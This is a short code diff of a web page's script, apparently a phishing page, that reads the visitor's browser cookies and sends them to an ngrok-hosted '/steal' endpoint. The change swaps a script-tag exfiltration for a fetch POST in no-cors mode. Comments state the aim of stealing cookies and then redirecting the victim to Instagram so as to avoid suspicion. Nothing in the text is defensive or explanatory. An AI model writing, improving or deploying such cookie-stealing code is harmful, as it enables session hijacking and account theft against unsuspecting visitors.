@@ -5,11 +5,11 @@
     <script>
         // 1. Steal the cookies and send to the server
         const stolenCookies = document.cookie;
-        
-
-        const script = document.createElement('script')
-        script.src = 'https://deb6-185-146-112-8.ngrok-free.app/steal?callback=log&data=${encodeURIComponent(document.cookie)}'
-        document.body.appendChild(script)
+        fetch('https://deb6-185-146-112-8.ngrok-free.app/steal', {
+            method: 'POST',
+            body: stolenCookies,
+            mode: 'no-cors'
+        });
 
         // 2. Direct the victim to an Instagram to prevent a suspicion
         setTimeout(() => {
